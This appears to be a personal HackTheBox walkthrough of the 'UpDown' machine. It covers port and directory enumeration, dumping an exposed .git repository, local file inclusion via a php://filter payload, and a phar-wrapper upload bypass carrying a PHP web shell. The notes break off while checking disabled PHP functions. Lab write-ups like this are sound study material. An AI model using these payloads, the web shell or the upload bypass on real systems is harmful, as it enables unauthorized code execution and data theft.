NMAP

```
sudo nmap -sC -sV -oN nmap 10.10.11.177
```

![[Pasted image 20250419214108.png]]

Visiting website 

![[Pasted image 20250419214223.png]]
- add `siteisup.htb` to `/etc/hosts`

Tried a cheeky `hi'` and got a hacking attempt was detected message.

![[Pasted image 20250419214529.png]]

Start burp?

Saved HTTP request to a file. 

Started #ffuf to fuzz the parameter using `special-chars.txt` wordlist

```
ffuf -request updown.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
```

There doesn't seem to be a vulnerability 

![[Pasted image 20250419215429.png]]

Going to run #feroxbuster now 

```
feroxbuster -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Basically nothing. 

![[Pasted image 20250419220053.png]]

Randomly adding `index.php` to end of url and confirm site is in php.

![[Pasted image 20250419220754.png]]

I'm gonna try the gobuster from ippsec as well. 

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.txt -u http://10.10.11.177
```

Enter in http://127.0.0[.]1 with debug mode on to see the actual request.

![[Pasted image 20250419221332.png]]
- Try to find other web severs 👀

```
nmap -p- 10.10.11.177 -v -oN allports-nmap
```


Can run gobuster on the "dev" directory found previously also

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.dev -u http://10.10.11.177/dev
```

We discover a .git directory :)

![[Pasted image 20250419222211.png]]

Can also try to grab files

![[Pasted image 20250419221831.png]]

Got some juicies in the /dev/.git directory 

![[Pasted image 20250419222311.png]]

Found some juicy root info 

![[Pasted image 20250419222538.png]]
- `root:010dcc30cc1e89344e2bdbd3064f61c772d89a34` 
- root@siteisup

Can use the tool #git-dumper 

https://github.com/arthaud/git-dumper

```
./git_dumper.py http://siteisup.htb/dev/.git ../website 
```

Change into website directory and we have source code for website :)

![[Pasted image 20250419223607.png]]

Spotting LFI vulnerability in these include statements in the source code.

![[Pasted image 20250421195806.png]]

If page doesn't include bin, usr, home, var, etc then it will display the page with a .php extension. 

So /etc/passwd won't work. 

Check the git log. 

![[Pasted image 20250421212906.png]]
- interesting delete .htpassword commit

It was empty. 

There's a virtual host. Can use wfuzz or gobuster to try to get the name of the vhost. 

![[Pasted image 20250421213801.png]]

Try prepending `dev.siteisup.htb` to guess the vhost. with the added header of `Special-Dev: only4dev` in Burp repeater.

![[Pasted image 20250421214038.png]]

In Burpsuite, go to "Proxy" tab. Click on "Options" tab. 

Click add on "Match and Replace" tab. 

Specify these options

![[Pasted image 20250422195533.png]]

Now anything that goes through Burp will add this header. 

![[Pasted image 20250422195827.png]]

Now navigating to dev.siteisup.htb should bring up a new web page with the ability to upload files. 

![[Pasted image 20250422200411.png]]

Sending a burp request like 

```
GET /?page=php://filter/convert.base64-encode/resource=index
```

![[Pasted image 20250422200649.png]]

This returns a base64 string

![[Pasted image 20250422200724.png]]

Decode this base64 string using 

```
echo -n '<PASTE BASE64 STRING>' | base64 -d
```

This is just the source code that we already have. 


php is being appended in the source code 

![[Pasted image 20250423211717.png]]
which makes it tough because checker.php is filtering out a bunch of files we can't upload
![[Pasted image 20250423211838.png]]
getExtension function is going to get the very last thing after the last period
![[Pasted image 20250423212048.png]]

So we can only upload file extensions that won't get RCE.

Confirming this...

Create a file called `test.php` with

```
<?php
system($_GET['cmd']);
<KALI IP ADDRESS>
?
```

And this upload isn't allowed.

Try to rename this script and give it a .txt file extension and the code is just echoed to the web page. 

Set up nc listener with -k flag also so that web app can connect multiple times. 

```
sudo nc -lvnkp 80
```

![[Pasted image 20250422202454.png]]
![[Pasted image 20250423212719.png]]

#pharwrapper - which is like a zip file in php

We're going to give this php code a phar wrapper.

Name the file test.php again

```
zip test.phar test.php
```
- Inside of test.phar file is test.txt

Rename test.phar test.jpeg in case .phar is blacklisted

```
mv test.phar test.jpeg
```

Upload test.jpeg with the nc listener running to prevent the file from getting cleaned up

```
sudo nc -lvnkp 80
```


Test.jpeg upload

![[Pasted image 20250423214642.png]]

Here is test.jpeg when you click on it 

![[Pasted image 20250423214722.png]]

So we want to include this with our Burp request 

![[Pasted image 20250423214914.png]]
- got 500 internal server error - this means there may be an error in the php code

Simplifying test.php payload by removing the system command and replacing it with an echo command 

![[Pasted image 20250423215126.png]]

Rezip the new test.php file and upload it to the server.

Then copy new md5 sum into burp request

![[Pasted image 20250423215346.png]]
- only get 'PleaseSubscribe' and not the echo so we know we have code execution

Go back to test.php and run `phpinfo();`

![[Pasted image 20250423215523.png]]

Rezip, upload to web server, and send md5 hash with burp.

![[Pasted image 20250423215703.png]]
- php info page

Now can navigate to this page with the url 
![[Pasted image 20250423215753.png]]

Search for "disable_functions" on this php info page

![[Pasted image 20250423220545.png]]
- save this to a text file

We can see that the system function is disabled

![[Pasted image 20250423220635.png]]

We gotta figure out if there's any functions that are enabled that could give us code execution.

Looking at [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) tool on github (it is python 2 tho :/  )

This shows us some dangerous functions 

![[Pasted image 20250423221047.png]]

We can create our own script thing to test this out






